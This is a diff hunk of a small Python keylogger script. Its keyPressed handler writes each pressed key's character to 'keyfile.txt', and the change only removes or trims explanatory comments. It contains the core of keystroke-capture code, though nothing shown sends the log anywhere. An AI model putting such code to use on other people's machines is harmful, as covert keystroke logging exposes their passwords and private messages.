@@ -4,11 +4,8 @@ def keyPressed(key):
     #with statement is used as it closes the file automatically and when error is raised, but doing the same manually using close() function consumes more lines of code
     #logkey helps identify the line open("keyfile.txt", 'a')
     with open("keyfile.txt", 'a') as logKey:
-        #try statement runs whatever is inisde the block and if it raises an error while doing that, the except block runs
         try:
-            #only takes the characters and not literal buttons as the listener function listens to all keys including mouse
-            #char = key.char if key.char else ' ' '''This is a shorthand way of writing: '''
-            if hasattr(key, 'char'):
+            if hasattr(key, 'char'):#hasattr returns True if key has the attribute char
                 logKey.write(key.char)
             else:
                 if key == keyboard.Key.space:
